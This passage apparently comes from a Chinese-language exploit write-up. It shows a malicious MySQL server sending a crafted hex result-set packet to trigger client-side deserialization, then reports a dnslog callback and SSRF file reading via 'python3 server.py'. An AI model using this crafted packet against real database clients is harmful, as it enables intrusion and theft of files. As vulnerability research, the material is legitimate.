[*] Sending the package : 01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000
```
收到dnslog：
![image](https://user-images.githubusercontent.com/30398606/209753044-4b4550c5-f975-4352-83d8-d086f23296a3.png)

SSRF读文件当然也能读到：
```
python3 server.py
```
